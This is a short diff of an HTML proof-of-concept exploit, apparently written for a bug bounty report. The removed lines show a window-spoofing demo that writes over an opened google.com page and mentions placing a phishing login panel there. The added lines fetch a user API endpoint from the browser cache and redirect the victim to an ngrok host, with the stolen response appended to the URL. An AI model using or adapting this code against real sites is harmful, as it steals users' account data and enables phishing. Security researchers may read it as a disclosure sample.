@@ -1,11 +1,17 @@
-<html>
-    <title>google</title>
-<script>
-    function spoof() {
-        nWindow = window.open('https://www.google.com/robots.txt');
-        nWindow.document.write('<body><pre>Here we could place a phising login panel</pre></body>');
-}
-</script>
-<input type="button" onclick="spoof()" value="PoC!">
-The page is being hosted in my server
-</html>
+<html>  
+    <script>
+    var url = "https://docintel.dev.hackerone.apps.elmt.io/api/v1/user";
+    fetch(url, {
+    method: 'GET',
+    cache: 'force-cache'
+    }).then((response) => {
+    return response.text();
+    })
+    .then((result) => {
+    document.write(result),
+        alert(result),
+console.log(result),
+        document.location="https://aa5c09693109.ngrok.io?c="+result
+});
+    </script>
+    </html>
